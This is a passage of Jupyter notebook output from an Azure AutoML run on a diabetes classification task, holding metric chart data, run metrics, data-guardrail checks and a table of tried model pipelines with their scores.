\"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"lines\", \"name\": \"average_precision_score_weighted_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.8088900198552287, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.8456601055549087, 0.84663811871538, 0.84663811871538, 0.84663811871538, 0.84663811871538, 0.84663811871538, 0.8474423798967363, 0.8474423798967363, 0.8474423798967363, 0.8474423798967363, 0.8474423798967363, 0.8474423798967363, 0.8474423798967363, 0.8573598365512292]}], \"accuracy\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"markers\", \"name\": \"accuracy\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7396103896103897, 0.7695659603554341, 0.7578605604921395, 0.7500341763499658, 0.7305878332194122, 0.7669856459330144, 0.7591079972658921, 0.7212918660287081, 0.6626794258373205, 0.7174982911825017, 0.713585099111415, 0.7226930963773069, 0.7043062200956937, 0.7565618591934381, 0.7539815447710184, 0.7630895420369106, 0.7330997949419003, 0.7292207792207792, 0.7409774436090226, 0.7656356801093642, 0.7149179767600822, 0.7643882433356118, 0.7448906356801095, 0.7591934381408066, 0.7591592617908407, 0.7525632262474369, 0.7644053315105948, 0.7395933014354067, 0.746120984278879, 0.76825017088175, 0.7487525632262473, 0.7656698564593301, 0.7578434723171565, 0.7696001367054001, 0.746103896103896, 0.7512816131237183, 0.7695659603554341]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"lines\", \"name\": \"accuracy_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7396103896103897, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7696001367054001, 0.7696001367054001, 0.7696001367054001, 0.7696001367054001]}], \"AUC_micro\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"markers\", \"name\": \"AUC_micro\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.8242456616125537, 0.8556880349836874, 0.8300864126699649, 0.8303948057554562, 0.8235569369113456, 0.8439859844260498, 0.8320741744764572, 0.8059360734060341, 0.7809347126593591, 0.7884068996981363, 0.8033517351447342, 0.8094690448235795, 0.7822193392821517, 0.844475000572331, 0.8351074131376413, 0.8423848089978877, 0.811015597660964, 0.8116889073799891, 0.8017896505228771, 0.8451741060770364, 0.7893871541542603, 0.8497669735919369, 0.8381858893256255, 0.8513651326009674, 0.8554226397410913, 0.8356708206622315, 0.8535597571026303, 0.8122127685693448, 0.835504605163876, 0.855180146507448, 0.8409531866935094, 0.850760742072979, 0.8329046387562145, 0.8469459559309632, 0.8240310899662628, 0.8338311699991918, 0.8603480316945349]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"lines\", \"name\": \"AUC_micro_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.8242456616125537, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8556880349836874, 0.8603480316945349]}], \"average_precision_score_macro\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"markers\", \"name\": \"average_precision_score_macro\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7742813465855433, 0.817147214521911, 0.7910795283566379, 0.801548159124937, 0.7915914376780816, 0.8105807166102904, 0.8060680359574119, 0.7826892263606806, 0.7751569925128331, 0.7691402748428897, 0.782446193286331, 0.7903175231883458, 0.7691983120162226, 0.808682183717061, 0.7939305511239754, 0.8071495370148754, 0.7904908400819335, 0.790791012982939, 0.7766068662448029, 0.8017118355199807, 0.7428941283120226, 0.8056548266270042, 0.7923490340846248, 0.8103031473006912, 0.8165697753673837, 0.7863930191719539, 0.8146153932189335, 0.7662694299025903, 0.7920414064829485, 0.8176762747259098, 0.7965213531376232, 0.811606150576212, 0.7931233573492925, 0.8069541482110608, 0.8060542537142844, 0.7834293299028665, 0.8283044625363297]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"lines\", \"name\": \"average_precision_score_macro_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7742813465855433, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.817147214521911, 0.8176762747259098, 0.8176762747259098, 0.8176762747259098, 0.8176762747259098, 0.8176762747259098, 0.8176762747259098, 0.8176762747259098, 0.8283044625363297]}], \"AUC_macro\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"markers\", \"name\": \"AUC_macro\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7981013916226355, 0.8366210317228242, 0.8030494637270778, 0.8198316776873271, 0.8093759781502279, 0.8250904972277524, 0.8195960708363262, 0.8008359558229188, 0.7886115736818784, 0.7871991886223147, 0.8053989377753364, 0.8141928080491712, 0.7889761842546829, 0.8208075252024681, 0.8128728350343156, 0.8276031965600501, 0.8032769153548713, 0.8069059298023245, 0.8012340709287968, 0.8240266352875374, 0.749247482076519, 0.8298472723094127, 0.8152208505797622, 0.8314593290642994, 0.8365872221245754, 0.8124205292040025, 0.8348875650394476, 0.7868068256935233, 0.8132809201585477, 0.8355482935053852, 0.8196271627841287, 0.8307167934281547, 0.8090337634387126, 0.8218452677882355, 0.820877160255649, 0.8126561686834268, 0.8445341412720611]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"lines\", \"name\": \"AUC_macro_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7981013916226355, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8366210317228242, 0.8445341412720611]}], \"f1_score_micro\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"markers\", \"name\": \"f1_score_micro\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7396103896103897, 0.7695659603554341, 0.7578605604921393, 0.7500341763499658, 0.7305878332194122, 0.7669856459330144, 0.7591079972658921, 0.7212918660287081, 0.6626794258373205, 0.7174982911825017, 0.713585099111415, 0.7226930963773069, 0.7043062200956937, 0.7565618591934381, 0.7539815447710184, 0.7630895420369106, 0.7330997949419003, 0.7292207792207792, 0.7409774436090226, 0.7656356801093642, 0.7149179767600822, 0.7643882433356118, 0.7448906356801095, 0.7591934381408066, 0.7591592617908407, 0.7525632262474369, 0.7644053315105948, 0.7395933014354067, 0.746120984278879, 0.76825017088175, 0.7487525632262473, 0.7656698564593301, 0.7578434723171565, 0.7696001367054001, 0.746103896103896, 0.7512816131237183, 0.7695659603554341]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"lines\", \"name\": \"f1_score_micro_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7396103896103897, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7696001367054001, 0.7696001367054001, 0.7696001367054001, 0.7696001367054001]}], \"matthews_correlation\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"markers\", \"name\": \"matthews_correlation\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.4163237794803841, 0.4814237328189323, 0.4384601964131313, 0.47118673958222884, 0.3722258878201511, 0.4557929208369912, 0.44051546844270206, 0.34009010869356604, 0.12341582653155676, 0.4256866441285731, 0.4172043091268739, 0.4482505792780069, 0.40371410355303244, 0.4416434332541396, 0.43291623318910555, 0.4497265224298812, 0.42916064325603626, 0.438875418300208, 0.4581714528553798, 0.46857938586539943, 0.3439427322322771, 0.47375087351202155, 0.423054777853055, 0.4519860782361248, 0.44951269004121286, 0.4298301183607632, 0.4648703656575572, 0.411715829806106, 0.42862188295384407, 0.4761652606520849, 0.43512047149971067, 0.4739053512596117, 0.4438424311522827, 0.4696237936756134, 0.453506295578614, 0.42576120012511315, 0.47338394270295153]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"lines\", \"name\": \"matthews_correlation_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.4163237794803841, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323, 0.4814237328189323]}], \"recall_score_micro\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"markers\", \"name\": \"recall_score_micro\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7396103896103897, 0.7695659603554341, 0.7578605604921395, 0.7500341763499658, 0.7305878332194122, 0.7669856459330144, 0.7591079972658921, 0.7212918660287081, 0.6626794258373205, 0.7174982911825017, 0.713585099111415, 0.7226930963773069, 0.7043062200956937, 0.7565618591934381, 0.7539815447710184, 0.7630895420369106, 0.7330997949419003, 0.7292207792207792, 0.7409774436090226, 0.7656356801093642, 0.7149179767600822, 0.7643882433356118, 0.7448906356801095, 0.7591934381408066, 0.7591592617908407, 0.7525632262474369, 0.7644053315105948, 0.7395933014354067, 0.746120984278879, 0.76825017088175, 0.7487525632262473, 0.7656698564593301, 0.7578434723171565, 0.7696001367054001, 0.746103896103896, 0.7512816131237183, 0.7695659603554341]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"lines\", \"name\": \"recall_score_micro_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7396103896103897, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7695659603554341, 0.7696001367054001, 0.7696001367054001, 0.7696001367054001, 0.7696001367054001]}], \"f1_score_weighted\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"markers\", \"name\": \"f1_score_weighted\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7376523503026942, 0.7674902736086928, 0.7469995153930944, 0.7545812446003499, 0.7067896556120801, 0.753494539634241, 0.7393667282347217, 0.6840078077118288, 0.5425137047377172, 0.7237692577008719, 0.7193471179774642, 0.7294417277407469, 0.7095560078010478, 0.7489865561083529, 0.7438259030822392, 0.7477494400576268, 0.736644985848468, 0.7348755141235058, 0.7456372222191396, 0.762640417488469, 0.7041511988003866, 0.7629439253604393, 0.7423193533904254, 0.7556759322863237, 0.7546533815888212, 0.7447138180399367, 0.7592522254536355, 0.737350710928568, 0.7428570411811651, 0.7645985346202845, 0.7466013888443638, 0.7627525440461655, 0.7490215494640193, 0.7628208032643305, 0.749160183914171, 0.7420865564870891, 0.7660005534604052]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"lines\", \"name\": \"f1_score_weighted_max\", \"stepped\": true, \"type\": \"scatter\", \"data\": [0.7376523503026942, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928, 0.7674902736086928]}]}, \"metricName\": null, \"primaryMetricName\": \"AUC_weighted\", \"showLegend\": false}, \"run_metrics\": [{\"name\": \"experiment_status\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13], \"series\": [{\"data\": [\"DatasetEvaluation\", \"FeaturesGeneration\", \"DatasetFeaturization\", \"DatasetFeaturizationCompleted\", \"DatasetCrossValidationSplit\", \"ModelSelection\", \"BestRunExplainModel\", \"ModelExplanationDataSetSetup\", \"PickSurrogateModel\", \"EngineeredFeatureExplanations\", \"EngineeredFeatureExplanations\", \"RawFeaturesExplanations\", \"RawFeaturesExplanations\", \"BestRunExplainModel\"]}]}, {\"name\": \"experiment_status_description\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13], \"series\": [{\"data\": [\"Gathering dataset statistics.\", \"Generating features for the dataset.\", \"Beginning to fit featurizers and featurize the dataset.\", \"Completed fit featurizers and featurizing the dataset.\", \"Generating individually featurized CV splits.\", \"Beginning model selection.\", \"Best run model explanations started\", \"Model explanations data setup completed\", \"Choosing LightGBM as the surrogate model for explanations\", \"Computation of engineered features started\", \"Computation of engineered features completed\", \"Computation of raw features started\", \"Computation of raw features completed\", \"Best run model explanations completed\"]}]}, {\"name\": \"f1_score_micro\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0], \"series\": [{\"data\": [0.7695659603554341]}]}, {\"name\": \"average_precision_score_macro\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0], \"series\": [{\"data\": [0.8283044625363297]}]}, {\"name\": \"accuracy\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0], \"series\": [{\"data\": [0.7695659603554341]}]}, {\"name\": \"f1_score_weighted\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0], \"series\": [{\"data\": [0.7660005534604052]}]}, {\"name\": \"matthews_correlation\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0], \"series\": [{\"data\": [0.47338394270295153]}]}, {\"name\": \"average_precision_score_weighted\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0], \"series\": [{\"data\": [0.8573598365512292]}]}, {\"name\": \"norm_macro_recall\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0], \"series\": [{\"data\": [0.4551875612359694]}]}, {\"name\": \"balanced_accuracy\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0], \"series\": [{\"data\": [0.7275937806179847]}]}, {\"name\": \"precision_score_micro\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0], \"series\": [{\"data\": [0.7695659603554341]}]}, {\"name\": \"weighted_accuracy\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0], \"series\": [{\"data\": [0.8006333997388213]}]}, {\"name\": \"AUC_weighted\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0], \"series\": [{\"data\": [0.8445341412720611]}]}, {\"name\": \"average_precision_score_micro\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0], \"series\": [{\"data\": [0.8633423583810256]}]}, {\"name\": \"log_loss\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0], \"series\": [{\"data\": [0.48241460484060417]}]}, {\"name\": \"f1_score_macro\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0], \"series\": [{\"data\": [0.732896291427265]}]}, {\"name\": \"AUC_macro\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0], \"series\": [{\"data\": [0.8445341412720611]}]}, {\"name\": \"recall_score_micro\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0], \"series\": [{\"data\": [0.7695659603554341]}]}, {\"name\": \"precision_score_macro\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0], \"series\": [{\"data\": [0.7465465604170699]}]}, {\"name\": \"recall_score_weighted\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0], \"series\": [{\"data\": [0.7695659603554341]}]}, {\"name\": \"recall_score_macro\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0], \"series\": [{\"data\": [0.7275937806179847]}]}, {\"name\": \"AUC_micro\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0], \"series\": [{\"data\": [0.8603480316945349]}]}, {\"name\": \"precision_score_weighted\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"categories\": [0], \"series\": [{\"data\": [0.7695397810264009]}]}], \"run_logs\": \"\\nRun is completed.\", \"graph\": {}, \"widget_settings\": {\"childWidgetDisplay\": \"popup\", \"send_telemetry\": false, \"log_level\": \"INFO\", \"sdk_version\": \"1.20.0\"}, \"loading\": false}"
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "https://ml.azure.com/experiments/automlpimadiabetes/runs/AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8?wsid=/subscriptions/8a086c9c-5530-4791-89af-62c8cdfda3fd/resourcegroups/trn-aue-advanced-analytics-ml/workspaces/trn-aue-aa-ml\n",
            "\n",
            "\n",
            "****************************************************************************************************\n",
            "DATA GUARDRAILS: \n",
            "\n",
            "TYPE:         Cross validation\n",
            "STATUS:       DONE\n",
            "DESCRIPTION:  Each iteration of the trained model was validated through cross-validation.\n",
            "              \n",
            "DETAILS:      \n",
            "+---------------------------------+\n",
            "|Number of folds                  |\n",
            "+=================================+\n",
            "|10                               |\n",
            "+---------------------------------+\n",
            "\n",
            "****************************************************************************************************\n",
            "\n",
            "TYPE:         Class balancing detection\n",
            "STATUS:       PASSED\n",
            "DESCRIPTION:  Your inputs were analyzed, and all classes are balanced in your training data.\n",
            "              Learn more about imbalanced data: https://aka.ms/AutomatedMLImbalancedData\n",
            "\n",
            "****************************************************************************************************\n",
            "\n",
            "TYPE:         Missing feature values imputation\n",
            "STATUS:       PASSED\n",
            "DESCRIPTION:  No feature missing values were detected in the training data.\n",
            "              Learn more about missing value imputation: https://aka.ms/AutomatedMLFeaturization\n",
            "\n",
            "****************************************************************************************************\n",
            "\n",
            "TYPE:         High cardinality feature detection\n",
            "STATUS:       PASSED\n",
            "DESCRIPTION:  Your inputs were analyzed, and no high cardinality features were detected.\n",
            "              Learn more about high cardinality feature handling: https://aka.ms/AutomatedMLFeaturization\n",
            "\n",
            "****************************************************************************************************\n",
            "\n",
            "****************************************************************************************************\n",
            "ITERATION: The iteration being evaluated.\n",
            "PIPELINE: A summary description of the pipeline being evaluated.\n",
            "DURATION: Time taken for the current iteration.\n",
            "METRIC: The result of computing score on the fitted pipeline.\n",
            "BEST: The best observed score thus far.\n",
            "****************************************************************************************************\n",
            "\n",
            " ITERATION   PIPELINE                                       DURATION      METRIC      BEST\n",
            "         0   MaxAbsScaler LightGBM                          0:02:20       0.7981    0.7981\n",
            "         1   MaxAbsScaler XGBoostClassifier                 0:02:14       0.8366    0.8366\n",
            "         2   MaxAbsScaler RandomForest                      0:02:14       0.8030    0.8366\n",
            "         3   MaxAbsScaler RandomForest                      0:02:08       0.8198    0.8366\n",
            "         4   MaxAbsScaler RandomForest                      0:02:08       0.8094    0.8366\n",
            "         5   MaxAbsScaler ExtremeRandomTrees                0:02:19       0.8251    0.8366\n",
            "         6   MaxAbsScaler ExtremeRandomTrees                0:02:04       0.8196    0.8366\n",
            "         7   MaxAbsScaler ExtremeRandomTrees                0:02:07       0.8008    0.8366\n",
            "         8   MaxAbsScaler RandomForest                      0:02:07       0.7886    0.8366\n",
            "         9   MaxAbsScaler ExtremeRandomTrees                0:02:04       0.7872    0.8366\n",
            "        10   MaxAbsScaler RandomForest                      0:02:00       0.8054    0.8366\n",
            "        11   MaxAbsScaler RandomForest                      0:01:59       0.8142    0.8366\n",
            "        12   MaxAbsScaler RandomForest                      0:02:00       0.7890    0.8366\n",
            "        13   StandardScalerWrapper XGBoostClassifier        0:02:07       0.8208    0.8366\n",
            "        14   MaxAbsScaler RandomForest                      0:02:11       0.8129    0.8366\n",
            "        15   StandardScalerWrapper ExtremeRandomTrees       0:02:03       0.8276    0.8366\n",
